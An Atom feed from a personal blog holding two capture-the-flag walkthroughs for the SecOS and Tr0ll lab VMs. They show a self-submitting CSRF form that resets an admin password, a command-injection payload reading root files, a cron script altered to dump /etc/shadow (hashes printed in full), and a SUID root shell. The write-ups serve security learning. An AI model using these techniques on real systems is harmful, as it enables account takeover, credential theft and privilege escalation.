<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: security | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/security/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2015-02-05T17:07:23+02:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Pentest lab - SecOS]]></title>
    <link href="http://chousensha.github.io/blog/2015/02/04/pentest-lab-secos/"/>
    <updated>2015-02-04T13:36:51+02:00</updated>
    <id>http://chousensha.github.io/blog/2015/02/04/pentest-lab-secos</id>
    <content type="html"><![CDATA[<p>SecOS is a web based VM created by PaulSec. Here is the briefing:</p>

<blockquote><p>Not too tired after BSides London? Still want to solve challenges? Here is the VM I told about during my talk where you&rsquo;ll have to practice some of
your skills to retrieve the precious flag located here: /root/flag.txt. This VM is an entry-level boot2root and is web based.</p></blockquote>

<!-- more -->


<p>The beginning should be familiar by now&hellip;</p>

<p>``` plain
nmap -A -p1-65535 192.168.80.128</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2015-02-04 13:36 EET
Nmap scan report for 192.168.80.128
Host is up (0.00085s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     (protocol 2.0)
| ssh-hostkey:
|   1024 9b:d9:32:f5:1d:19:88:d3:e7:af:f0:4e:21:76:7a:c8 (DSA)
|   2048 90:b0:3d:99:ed:5b:1b:e1:d4:e6:b5:dd:e9:70:89:f5 (RSA)
|<em>  256 78:2a:d9:e3:63:83:24:dc:2a:d4:f6:4a:ac:2c:70:5a (ECDSA)
8081/tcp open  http    Node.js (Express middleware)
|</em>http-title: Secure Web App
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="http://www.insecure.org/cgi-bin/servicefp-submit.cgi">http://www.insecure.org/cgi-bin/servicefp-submit.cgi</a> :
SF-Port22-TCP:V=6.47%I=7%D=2/4%Time=54D20435%P=x86_64-unknown-linux-gnu%r(
SF:NULL,27,&ldquo;SSH-2.0-OpenSSH_6.6p1\x20Ubuntu-2ubuntu1\r\n&rdquo;);
MAC Address: 00:0C:29:F4:5D:DC (VMware)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.11 &ndash; 3.14
```</p>

<p>Let&rsquo;s see what&rsquo;s running on port 8081:</p>

<p><img class="center" src="/images/pentest/secos/site.png" title="&lsquo;secos site&rsquo; &lsquo;site&rsquo;" ></p>

<p>Looking at the about page, we can see the site is really secure!</p>

<p><img class="center" src="/images/pentest/secos/about.png" title="&lsquo;secos about&rsquo; &lsquo;about&rsquo;" ></p>

<p>Also, there is some sort of hint in the source code:</p>

<p>``` html</p>

<!--<li><a href="http://chousensha.github.io/hint">Wanna help?</a></li>!-->


<p>```</p>

<p>Checking that page, there is this message:</p>

<p><img class="center" src="/images/pentest/secos/doh.png" title="&lsquo;troll&rsquo; &lsquo;troll&rsquo;" ></p>

<p>Well, there is something to see in the source code:</p>

<p>``` html</p>

<!--
        First: the admin visits the website (really) frequently
        Second: He runs it locally, on 127.0.0.1. 
        Third: CSRF and /(http:\/\/[-\/\.\w:0-9\?&]+)/gi, I think that's enough
        !-->


<p>```</p>

<p>I created a user to check the functionality of the app. It seems you can send and receive messages between users. The spiderman user is the admin, so we&rsquo;re mainly interested in that account. Using the hint, the likely course seems to be crafting a CSRF request to change the admin&rsquo;s password and sending it to him in a message.</p>

<p>First, a HTML form that will take care of resetting the password:</p>

<p>``` html
<html>
<body>
<form name="changepass" method="post" action="http://127.0.0.1:8081/change-password">
<input type="hidden" name="username" value="spiderman">
<input type="hidden" name="password" value="pwned">
</form></p>

<script type="text/javascript">
document.changepass.submit();
</script>


<p></body>
</html>
```</p>

<p>Breaking it up, the form submits the username and password (which are hidden because we are using Javascript to send them to the server, and not clicking buttons ourselves) to the change password page. Because of the hint we found in the source code, we are using the localhost address instead of the machine&rsquo;s IP. I copied it to <code>/var/www/</code> and served it with apache.</p>

<p>And now to send a message to spiderman, with a URL for him to click:</p>

<p><img class="center" src="/images/pentest/secos/sendcsrf.png" title="&lsquo;sendcsrf&rsquo; &lsquo;sendcsrf&rsquo;" ></p>

<p>Success! His password was reset and we can log in with the new password that we&rsquo;ve just set. In the Messages section, we see that another user also had less than honorable intentions:</p>

<p><img class="center" src="/images/pentest/secos/pirate.png" title="&lsquo;pirate&rsquo; &lsquo;pirate&rsquo;" ></p>

<p>Next thing I did was try to SSH into the box as spiderman, with the password <em>CrazyPassword!</em>. And it worked! In spiderman&rsquo;s home directory, there is a folder called <em>vnwa</em>..a vulnerable web application maybe? I found something potentially interesting buried in the <em>internalServer.js</em> code:</p>

<p>``` plain
spiderman@SecOS-1:~/vnwa$ cat internalServer.js
var fs = require(&lsquo;fs&rsquo;);
var express = require(&lsquo;express&rsquo;);
var http = require(&lsquo;http&rsquo;);
var sys = require(&lsquo;sys&rsquo;)
var exec = require(&lsquo;child_process&rsquo;).exec;
var crypto = require(&lsquo;crypto&rsquo;);</p>

<p>var utils = require(&lsquo;./lib/utils.js&rsquo;);
var model = require(&lsquo;./lib/model.js&rsquo;);</p>

<p>var app = express();
var server = http.createServer(app);</p>

<p>var logger = function (req, res, next) {</p>

<pre><code>console.log(req.connection.remoteAddress + " tried to access : " + req.url);
next(); // Passing the request to the next handler in the stack.
</code></pre>

<p>}</p>

<p>// Configuration
app.configure(function () {</p>

<pre><code>// Session management
app.use(express.cookieParser());
app.use(express.session({secret: 'privateKeyForSession'}));
app.use("/js", express.static(__dirname + '/public/js')); // javascript folder
app.use("/css", express.static(__dirname + '/public/css')); // javascript folder

app.set('views', __dirname + '/views'); // views folder
app.set('view engine', 'ejs'); // view engine for this projet : ejs 

app.use(express.bodyParser()); // for POST Requests
app.use(logger); // Here you add your logger to the stack.
app.use(app.router); // The Express routes handler.
</code></pre>

<p>});</p>

<p>app.get(&lsquo;/&rsquo;, function (req, res) {</p>

<pre><code>res.render('ping.ejs', {
    isConnected: req.session.isConnected,
    isAdmin: req.session.isAdmin
});
</code></pre>

<p>});</p>

<p>// Update password
app.post(&lsquo;/&rsquo;, function (req, res) {</p>

<pre><code>ip = req.body.ip
if (ip == "") {
    utils.redirect(req, res, '/ping-status');
} else {
    // getting the command with req.params.command
    var child;
    // console.log(req.params.command);
    child = exec('ping ' + ip, function (error, stdout, stderr) {
        res.render('ping.ejs', {
            isConnected: req.session.isConnected,
            message: stdout,
            isAdmin: req.session.isAdmin
        });
    });
}
</code></pre>

<p>});</p>

<p>server.listen(9000, &lsquo;127.0.0.1&rsquo;, function() {
  console.log(&ldquo;Listening on port 9000&rdquo;);
});
```</p>

<p>Indeed, this app is listening on port 9000:</p>

<p><code>plain
spiderman@SecOS-1:~/vnwa/scripts$ netstat -antp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -               
...
</code></p>

<p>By looking at the code, it seems it&rsquo;s a pinging app. During the enumeration phase, I also noticed that unlike the web server we&rsquo;ve exploited, this internal server is run by root:</p>

<p><code>plain
ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...
root       186  0.0  0.1   4692   960 ?        Ss   11:40   0:00 sudo -u spiderman sh -c /usr/local/bin/node /home/spiderman/vnwa/server.js
root       188  0.0  0.1   4692   956 ?        Ss   11:40   0:00 sudo -u root sh -c /usr/local/bin/node /home/spiderman/vnwa/internalServer.js
...
</code></p>

<p>To access this application, I set up a SSH tunnel. On my machine, I ran this command:</p>

<p><code>plain
ssh -f -N -L 4444:127.0.0.1:9000 -l spiderman 192.168.80.128
</code></p>

<p>This allowed me to connect to the remote application on port 9000 from the browser of my Kali machine. Let me break it up:</p>

<ul>
<li><p><strong>-f</strong> Requests ssh to go to background just before command execution. This is useful if ssh is going to ask for passwords or passphrases, but the user wants it in the background.</p></li>
<li><p><strong>-N</strong> Do not execute a remote command.  This is useful for just forwarding ports.</p></li>
<li><p><strong>-L</strong> [bind_address:]port:host:hostport</p></li>
</ul>


<p>Specifies that the given port on the local (client) host is to be
forwarded to the given host and port on the remote side.  This
works by allocating a socket to listen to <strong>port</strong> on the local side,
optionally bound to the specified <strong>bind_address</strong>.  Whenever a connection is made to this port, the connection is forwarded over
the secure channel, and a connection is made to <strong>host</strong> port
<strong>hostport</strong> from the remote machine.</p>

<ul>
<li><p><strong>-l</strong> Specifies the user to log in as on the remote machine.</p></li>
<li><p><strong>192.168.80.128</strong> The IP address of the SecOS box</p></li>
</ul>


<p>What this did was forwarding the connections to port 4444 on my local machine to the remote server on port 9000. Remember that the application is only listening on the localhost interface on the SecOS box. So, the SecOS machine is acting as a sort of gateway, tunneling the connections I point to my 4444 port to the 9000 port on localhost. You can read some more about how this works on <a href="http://en.wikibooks.org/wiki/OpenSSH/Cookbook/Tunnels">http://en.wikibooks.org/wiki/OpenSSH/Cookbook/Tunnels</a></p>

<p>Now, in my browser, I went to <a href="http://127.0.0.1:4444/">http://127.0.0.1:4444/</a> and:</p>

<p><img class="center" src="/images/pentest/secos/ping.png" title="&lsquo;ping&rsquo; &lsquo;ping&rsquo;" ></p>

<p>I tried pinging my Kali machine to see if it works but it just appeared to hang. So I tried limiting the amount of pings by entering <code>-c 2</code> after the IP to be pinged. And it worked!</p>

<p><img class="center" src="/images/pentest/secos/pingres.png" title="&lsquo;ping result&rsquo; &lsquo;ping result&rsquo;" ></p>

<p>We know the ping app is running as root, so if we can do remote code execution, we&rsquo;ll be able to run commands as root. And the application is vulnerable to just what we need! Remember these lines from the internal server code:</p>

<p><code>javascript
ip = req.body.ip
child = exec('ping ' + ip, function (error, stdout, stderr)
</code></p>

<p>The <em>ip</em> variable is passed to the <em>exec</em> function without any prior input sanitization. So, we just close the first command (which would be the ping), and insert an additional command of our choosing, which in this case will be to read the flag:</p>

<p><code>plain
;cat /root/flag.txt
</code></p>

<p>And profit!</p>

<p><img class="center" src="/images/pentest/secos/win.png" title="&lsquo;flag&rsquo; &lsquo;flag&rsquo;" ></p>

<blockquote><p>Don&rsquo;t tell any big lies today.  Small ones can be just as effective.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Tr0ll]]></title>
    <link href="http://chousensha.github.io/blog/2014/11/30/pentest-lab-tr0ll/"/>
    <updated>2014-11-30T08:48:14+02:00</updated>
    <id>http://chousensha.github.io/blog/2014/11/30/pentest-lab-tr0ll</id>
    <content type="html"><![CDATA[<p>Next in my lab series will be another machine from VulnHub:</p>

<blockquote><p>Tr0ll was inspired by the constant trolling of the machines within the OSCP labs.</p>

<p>The goal is simple, gain root and get Proof.txt from the /root directory.</p>

<p>Not for the easily frustrated! Fair warning, there be trolls ahead!</p></blockquote>

<!-- more -->


<p>As always, I start with a guns blazing Nmap scan:</p>

<p>``` plain
nmap -A -p1-65535 192.168.80.134</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-11-30 08:55 EET
Nmap scan report for 192.168.80.134
Host is up (0.00086s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|<em>-rwxrwxrwx    1 1000     0            8068 Aug 09 23:43 lol.pcap [NSE: writeable]
22/tcp open  ssh     (protocol 2.0)
| ssh-hostkey:
|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)
|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)
|</em>  256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|<em>/secret
|</em>http-title: Site doesn&rsquo;t have a title (text/html).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="http://www.insecure.org/cgi-bin/servicefp-submit.cgi">http://www.insecure.org/cgi-bin/servicefp-submit.cgi</a> :
SF-Port22-TCP:V=6.47%I=7%D=11/30%Time=547ABF60%P=x86_64-unknown-linux-gnu%
SF:r(NULL,29,&ldquo;SSH-2.0-OpenSSH_6.6.1p1\x20Ubuntu-2ubuntu2\r\n&rdquo;);
MAC Address: 00:0C:29:F8:CC:3D (VMware)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.11 &ndash; 3.14
Network Distance: 1 hop
Service Info: OS: Unix</p>

<p>TRACEROUTE
HOP RTT     ADDRESS
1   0.86 ms 192.168.80.134</p>

<p>OS and Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
Nmap done: 1 IP address (1 host up) scanned in 14.06 seconds
```</p>

<p>Not an awful lot to start with. First thing, I checked what&rsquo;s being served on port 80, and of course, there was a troll:</p>

<p><img class="center" src="/images/pentest/tr0ll/troll1.png" title="&lsquo;troll&rsquo; &lsquo;troll&rsquo;" ></p>

<p>The &ldquo;secret&rdquo; doesn&rsquo;t help much either, other than potentially hinting at the use of steganography, which I am very bad at.</p>

<p><img class="center" src="/images/pentest/tr0ll/troll2.png" title="&lsquo;troll2&rsquo; &lsquo;troll2&rsquo;" ></p>

<p>I also searched for a vsftpd exploit suitable to the 3.0.2 version, which I couldn&rsquo;t find. So before trying to search for hidden data that might not even exist inside the images, and even if it does, I wouldn&rsquo;t be able to find it anyway, I&rsquo;m going to see if there is anything interesting lying around the FTP server.</p>

<p>Logging in with the <em>anonymous/anonymous</em> credentials, I see there is a pcap file waiting:</p>

<p><code>plain
ftp&gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     0            8068 Aug 09 23:43 lol.pcap
226 Directory send OK.
</code></p>

<p>I downloaded it to my machine so I can check it out with Wireshark:</p>

<p><code>plain
ftp&gt; get lol.pcap
local: lol.pcap remote: lol.pcap
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for lol.pcap (8068 bytes).
226 Transfer complete.
8068 bytes received in 0.05 secs (148.1 kB/s)
</code></p>

<p>Scanning through the packets I noticed something interesting:</p>

<p><img class="center" src="/images/pentest/tr0ll/wireshark.png" title="&lsquo;secret stuff&rsquo; &lsquo;secret stuff&rsquo;" ></p>

<p>And when following the stream, even more interesting tidbits:</p>

<p><img class="center" src="/images/pentest/tr0ll/stream.png" title="&lsquo;TCP stream&rsquo; &lsquo;tcp stream&rsquo;" ></p>

<p>So why don&rsquo;t we see the secret stuff for ourselves! In order to see what&rsquo;s inside the secret file, I looked at the FTP-DATA packet that comes after requesting the transfer. I highlighted it below and you can see it&rsquo;s the correct size (147 bytes):</p>

<p><img class="center" src="/images/pentest/tr0ll/ftpdata.png" title="&lsquo;ftp data&rsquo; &lsquo;ftp data&rsquo;" ></p>

<p>If you follow the stream you will see this:</p>

<p>``` plain
Well, well, well, aren&rsquo;t you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P</p>

<p>Sucks, you were so close&hellip; gotta TRY HARDER!
```</p>

<p>Finally, some progress! As an aside, this information could also be obtained just by running <em>strings</em> on the pcap file. Now let&rsquo;s go back to the browser and see what&rsquo;s inside that directory. To keep up with the troll theme, there&rsquo;s a BIN file named roflmao. Again I felt a little discouraged because I have only a rudimentary grasp of binary analysis and reverse engineering at the moment. Running <em>strings</em> on it, the only interesting thing I noticed was this line:</p>

<p><code>plain
Find address 0x0856BF to proceed
</code></p>

<p>If you run it (make it executable or you will get a permission denied error), you will see that it only prints the above line and exits. Time for GDB!</p>

<p><code>plain
Dump of assembler code for function main:
   0x0804841d &lt;+0&gt;: push   ebp
   0x0804841e &lt;+1&gt;: mov    ebp,esp
   0x08048420 &lt;+3&gt;: and    esp,0xfffffff0
   0x08048423 &lt;+6&gt;: sub    esp,0x10
   0x08048426 &lt;+9&gt;: mov    DWORD PTR [esp],0x80484d0
   0x0804842d &lt;+16&gt;:    call   0x80482f0 &lt;printf@plt&gt;
   0x08048432 &lt;+21&gt;:    leave  
   0x08048433 &lt;+22&gt;:    ret   
</code></p>

<p>I looked around as much as I could, but the program is a really small one and I could find nothing hidden. Also the address didn&rsquo;t seem to fit in with any of the memory addresses inside the binary, so I thought maybe it&rsquo;s just a hint for continuing elsewhere. The only place that came to mind was to try for another hidden directory on the web server:</p>

<p><img class="center" src="/images/pentest/tr0ll/0856bf.png" title="&lsquo;hidden&rsquo; &lsquo;win&rsquo;" ></p>

<p>Woohoo! We&rsquo;re on the right track. Now it seems both directories contain a text file with..users and a password?</p>

<p><img class="center" src="/images/pentest/tr0ll/which_one.png" title="&lsquo;passwords&rsquo; &lsquo;which pass&rsquo;" ></p>

<p><img class="center" src="/images/pentest/tr0ll/gj.png" title="&lsquo;good job&rsquo; &lsquo;gj&rsquo;" ></p>

<p>I tried connecting to SSH using the password in the Pass.txt files and usernames from the other file. Then I also tried to connect as root, troll, tr0ll, using everything in the lists as password. Manually.. Anyway, when nothing worked, I had to take a break and think that it&rsquo;s most likely trolling me, as it did in all the previous steps. So, looking at the directory index, it&rsquo;s apparent that one folder contains the password and the other one a list with potential usernames, from which you have to find the correct one to go with the password. But since I&rsquo;ve already tried that and failed, I didn&rsquo;t know what else to do. Now, the Pass.txt file contained a good job message that seemed to be the actual password, but maybe it was just a normal good job..implying that I already found the password. So I tried SSH again, this time using Pass as password..and when that didn&rsquo;t work, even which_one_lol. This was more wasted effort, so lastly, I literally used the name of the file as password: Pass.txt. And! Combining it with the overflow user&hellip;success!! Now I started looking around, but before I could find anything, I&rsquo;ve been booted by the shell?!</p>

<p>``` plain
Broadcast Message from root@trol</p>

<pre><code>    (somewhere) at 5:45 ...                                                
</code></pre>

<p>TIMES UP LOL!</p>

<p>Connection to 192.168.80.134 closed by remote host.
Connection to 192.168.80.134 closed.
```</p>

<p>After more logins, it appears the shell is killed every few minutes. So, this troll might be playing with cron. The only other lead I had so far was a file named <em>lmao.py</em> in the <code>/opt/</code>, but I didn&rsquo;t have permission to read it. I took a look in the <code>/var/log</code> directory:</p>

<p><code>plain
$ ls /var/log
alternatives.log    cronlog   fail2ban.log    udev
alternatives.log.1  dist-upgrade  fail2ban.log.1  upstart
apache2         dmesg     faillog     vmware-tools-upgrader.log
apt         dmesg.0   fsck        vsftpd.log
auth.log        dmesg.1.gz    installer   vsftpd.log.1
auth.log.1      dmesg.2.gz    kern.log    wtmp
boot.log        dmesg.3.gz    kern.log.1      wtmp.1
bootstrap.log       dmesg.4.gz    lastlog
btmp            dpkg.log      syslog
btmp.1          dpkg.log.1    syslog.1
$ cd /var/log
$ cat cronlog
*/2 * * * * cleaner.py
</code></p>

<p>So, that cleaner.py file seems to be a likely culprit. I searched for it and I found something interesting:</p>

<p>``` plain
$ locate cleaner.py
/lib/log/cleaner.py
/var/tmp/cleaner.py.swp
$ cat /lib/log/cleaner.py</p>

<h1>!/usr/bin/env python</h1>

<p>import os
import sys
try:</p>

<pre><code>os.system('rm -r /tmp/* ')
</code></pre>

<p>except:</p>

<pre><code>sys.exit()
</code></pre>

<p>$ cat /var/tmp/cleaner.py.swp
crontab for cleaner.py successful
```</p>

<p>Ok, so this cleaner deletes all the contents of the <code>/tmp/</code> folder. The great part about it though, is the wonderful permissions it has:</p>

<p><code>plain
$ ls -l /lib/log/cleaner.py
-rwxrwxrwx 1 root root 96 Aug 13 00:13 /lib/log/cleaner.py
</code></p>

<p>So we can modify it to help in compromising the system. First thing I did was add the following code to copy the contents of the <code>/etc/shadow</code> file to a txt file in the <em>/tmp/</em> folder:</p>

<p>``` python
with open(&lsquo;/etc/shadow&rsquo;, &lsquo;r&rsquo;) as shadow:</p>

<pre><code>juicy = shadow.read()
</code></pre>

<p>with open(&lsquo;/tmp/hashes.txt&rsquo;, &lsquo;a&rsquo;) as hashes:</p>

<pre><code>hashes.write(juicy)
</code></pre>

<p>```</p>

<p>Now we have the password hashes and we could crack them if we wanted:</p>

<p><code>plain
$ cat /tmp/hashes.txt
root:$6$mdQyunCS$qRhQug5j4xuM2vwsSlFJ0TrAVmfCV5h0VgKjbBp5BN2hL6ySxGL8Tt.qa2GlVotm7DFK7OUG9naqK6Kdf1aEZ.:16292:0:99999:7:::
daemon:*:16273:0:99999:7:::
bin:*:16273:0:99999:7:::
sys:*:16273:0:99999:7:::
sync:*:16273:0:99999:7:::
games:*:16273:0:99999:7:::
man:*:16273:0:99999:7:::
lp:*:16273:0:99999:7:::
mail:*:16273:0:99999:7:::
news:*:16273:0:99999:7:::
uucp:*:16273:0:99999:7:::
proxy:*:16273:0:99999:7:::
www-data:*:16273:0:99999:7:::
backup:*:16273:0:99999:7:::
list:*:16273:0:99999:7:::
irc:*:16273:0:99999:7:::
gnats:*:16273:0:99999:7:::
nobody:*:16273:0:99999:7:::
libuuid:!:16273:0:99999:7:::
syslog:*:16273:0:99999:7:::
messagebus:*:16291:0:99999:7:::
troll:$6$9WnrXzBm$ijsblc.QCK1kTlHCxiH5Dt3eUhZgEVaIpkIifyIx6EmPpD03xmIyPD6l/dVlUAE0Q4jGqaiusEkvb3BEDNcs6.:16292:0:99999:7:::
sshd:*:16291:0:99999:7:::
ftp:*:16292:0:99999:7:::
lololol:!:16292:0:99999:7:::
overflow:$6$RSQQWzPh$JB3Jm3liSEjq.ytLU2Hr.N6bTUEgkVtW5KSkCzVzvLf7zBT4eHuc0EUeEUPw3v5epKsZ9mLFfurV6gSUtpcZa.:16292:0:99999:7:::
ps-aux:$6$N8fO8B2w$ABHj.O2jTfIizBfrb0SpgN6VJLDujJ6o9wR4D0b4ZqqlfKQzW1M0xG0uTR4AZW77BFH0rsA2ZxnoGSMdwy3k00:16292:0:99999:7:::
maleus:$6$Y.Ev9AQx$IS.ikFcKj5.natBbOMMP3GiV9LJDjCQaHuvKoEeA1hPjhss8qLzjVPpuSnKysIF261sSnjOfoFjhpo.rO8qDg.:16292:0:99999:7:::
felux:$6$t0WWHdf0$9QYd6dc9XuZo.RwMRCdrzuTPTqaCJ47KAS7p1EitR2LVGJsOqjarTxD67WUhLQvmF3KOFIfgvN3rlw7cfU132.:16292:0:99999:7:::
Eagle11:$6$Pz9WUVEk$PPQQs334rlXCZRRY1w/uullgDaKeIMGNlzUXERsCl7zIrdulDtrcYD74t/mtw0yhqsJJQFXrZ08dpk0gEx0gX1:16292:0:99999:7:::
genphlux:$6$K2gip8vY$jcbwnoeCKqtu.9IkVbBNDJ3TAV0NcVSWgv2U3uYx1e942dcaD1NhxEpBklKAX1NnnrDCw6SU1Fw7vJ6tmOiCM/:16292:0:99999:7:::
usmc8892:$6$MlFBCUvT$YS7ZpyXavI6tGgYJW3fPFRbUlV2yhoHGir26minsRRBTTDf60NIwxi7PP3S8/vePYFBVVuSC0kfyBYeMnHnBO1:16292:0:99999:7:::
blawrg:$6$Pg7SOYWy$Ap9wmycvq0n2iR8CJNKcY/SBUrOqC4Dc8D6whHDnZNp8xqLCB/GF2Et4lHnhHehWkgObxSX5MZWofAc4QQSbj1:16292:0:99999:7:::
wytshadow:$6$Xw3TqkwY$O2Xx5JXO9DXSyqumRCBWa2fk0Z0glVUNty9nKkms4SlAKMtWwmHvNRHiIClPa4SGvCii0fCi5Xxg6gvoZrXhG0:16292:0:99999:7:::
vis1t0r:$6$nVShrZJb$ZAZ9nf4vzddUm1ISPO8gKgYweQopjc/Ta7jbEacYbDVOG1g8Y3LHwiJhU2NsDJljkn2Oc4xPJPeMpox5jSBHd0:16292:0:99999:7:::
root:$6$mdQyunCS$qRhQug5j4xuM2vwsSlFJ0TrAVmfCV5h0VgKjbBp5BN2hL6ySxGL8Tt.qa2GlVotm7DFK7OUG9naqK6Kdf1aEZ.:16292:0:99999:7:::
daemon:*:16273:0:99999:7:::
bin:*:16273:0:99999:7:::
sys:*:16273:0:99999:7:::
sync:*:16273:0:99999:7:::
games:*:16273:0:99999:7:::
man:*:16273:0:99999:7:::
lp:*:16273:0:99999:7:::
mail:*:16273:0:99999:7:::
news:*:16273:0:99999:7:::
uucp:*:16273:0:99999:7:::
proxy:*:16273:0:99999:7:::
www-data:*:16273:0:99999:7:::
backup:*:16273:0:99999:7:::
list:*:16273:0:99999:7:::
irc:*:16273:0:99999:7:::
gnats:*:16273:0:99999:7:::
nobody:*:16273:0:99999:7:::
libuuid:!:16273:0:99999:7:::
syslog:*:16273:0:99999:7:::
messagebus:*:16291:0:99999:7:::
troll:$6$9WnrXzBm$ijsblc.QCK1kTlHCxiH5Dt3eUhZgEVaIpkIifyIx6EmPpD03xmIyPD6l/dVlUAE0Q4jGqaiusEkvb3BEDNcs6.:16292:0:99999:7:::
sshd:*:16291:0:99999:7:::
ftp:*:16292:0:99999:7:::
lololol:!:16292:0:99999:7:::
overflow:$6$RSQQWzPh$JB3Jm3liSEjq.ytLU2Hr.N6bTUEgkVtW5KSkCzVzvLf7zBT4eHuc0EUeEUPw3v5epKsZ9mLFfurV6gSUtpcZa.:16292:0:99999:7:::
ps-aux:$6$N8fO8B2w$ABHj.O2jTfIizBfrb0SpgN6VJLDujJ6o9wR4D0b4ZqqlfKQzW1M0xG0uTR4AZW77BFH0rsA2ZxnoGSMdwy3k00:16292:0:99999:7:::
maleus:$6$Y.Ev9AQx$IS.ikFcKj5.natBbOMMP3GiV9LJDjCQaHuvKoEeA1hPjhss8qLzjVPpuSnKysIF261sSnjOfoFjhpo.rO8qDg.:16292:0:99999:7:::
felux:$6$t0WWHdf0$9QYd6dc9XuZo.RwMRCdrzuTPTqaCJ47KAS7p1EitR2LVGJsOqjarTxD67WUhLQvmF3KOFIfgvN3rlw7cfU132.:16292:0:99999:7:::
Eagle11:$6$Pz9WUVEk$PPQQs334rlXCZRRY1w/uullgDaKeIMGNlzUXERsCl7zIrdulDtrcYD74t/mtw0yhqsJJQFXrZ08dpk0gEx0gX1:16292:0:99999:7:::
genphlux:$6$K2gip8vY$jcbwnoeCKqtu.9IkVbBNDJ3TAV0NcVSWgv2U3uYx1e942dcaD1NhxEpBklKAX1NnnrDCw6SU1Fw7vJ6tmOiCM/:16292:0:99999:7:::
usmc8892:$6$MlFBCUvT$YS7ZpyXavI6tGgYJW3fPFRbUlV2yhoHGir26minsRRBTTDf60NIwxi7PP3S8/vePYFBVVuSC0kfyBYeMnHnBO1:16292:0:99999:7:::
blawrg:$6$Pg7SOYWy$Ap9wmycvq0n2iR8CJNKcY/SBUrOqC4Dc8D6whHDnZNp8xqLCB/GF2Et4lHnhHehWkgObxSX5MZWofAc4QQSbj1:16292:0:99999:7:::
wytshadow:$6$Xw3TqkwY$O2Xx5JXO9DXSyqumRCBWa2fk0Z0glVUNty9nKkms4SlAKMtWwmHvNRHiIClPa4SGvCii0fCi5Xxg6gvoZrXhG0:16292:0:99999:7:::
vis1t0r:$6$nVShrZJb$ZAZ9nf4vzddUm1ISPO8gKgYweQopjc/Ta7jbEacYbDVOG1g8Y3LHwiJhU2NsDJljkn2Oc4xPJPeMpox5jSBHd0:16292:0:99999:7:::
</code></p>

<p>But I am not a fan of cracking passwords, if it can be avoided. And in this case, we still have the other Python file to check. So I modified the cleaner code again:</p>

<p>``` python
with open(&lsquo;/opt/lmao.py&rsquo;, &lsquo;r&rsquo;) as lmao:</p>

<pre><code>lol = lmao.read()
</code></pre>

<p>with open(&lsquo;/tmp/lol.py&rsquo;, &lsquo;a&rsquo;) as rofl:</p>

<pre><code>rofl.write(lol)
</code></pre>

<p>```</p>

<p>And after a little bit of waiting, we finally have the culprit that is killing our shells:</p>

<p>``` plain
$ cat /tmp/lol.py</p>

<h1>!/usr/bin/env python</h1>

<p>import os</p>

<p>os.system(&lsquo;echo &ldquo;TIMES UP LOL!&rdquo;|wall&rsquo;)
os.system(&ldquo;pkill -u &lsquo;overflow&rsquo;&rdquo;)
sys.exit()
```</p>

<p>Ok, now let&rsquo;s finish by getting a shell. We can leverage the cleaner file to copy the shell executable and give it outrageously lax permissions and SUID bit. Note that I&rsquo;m not saying bash, because the shell being used here is the <em>sh</em> shell.</p>

<p><code>plain
$ echo $SHELL
/bin/sh
</code></p>

<p>Here is the simple code for copying the shell file to <em>/tmp/</em> and letting everyone run it with root permissions:</p>

<p>``` python
import os</p>

<p>os.system(&lsquo;cp /bin/sh /tmp/trolled&rsquo;)
os.system(&lsquo;chmod 4777 /tmp/trolled&rsquo;)
```</p>

<p>Now just wait for cron. Check the loot and pwn the troll!</p>

<p>``` plain
$ ls -l /tmp/trolled
-rwsrwxrwx 1 root root 112204 Feb  3 04:50 /tmp/trolled
$ /tmp/trolled</p>

<h1>whoami</h1>

<p>root</p>

<h1>ls /root/</h1>

<p>proof.txt</p>

<h1>cat /root/proof.txt</h1>

<p>Good job, you did it!</p>

<p>702a8c18d29c6f3ca0d99ef5712bfbdc
```</p>

<p>Alternatively, since the original objective was only to read the proof file, you can just use the cleaner file to do it, providing you know the name of the proof file:</p>

<p>``` python
with open(&lsquo;/root/proof.txt&rsquo;, &lsquo;r&rsquo;) as proof:</p>

<pre><code>win = proof.read()
</code></pre>

<p>with open(&lsquo;/tmp/proof.txt&rsquo;, &lsquo;a&rsquo;) as pwned:</p>

<pre><code>pwned.write(win)
</code></pre>

<p>```</p>

<p>And here it is:</p>

<p>``` plain
$ cat /tmp/proof.txt
Good job, you did it!</p>

<p>702a8c18d29c6f3ca0d99ef5712bfbdc
```</p>

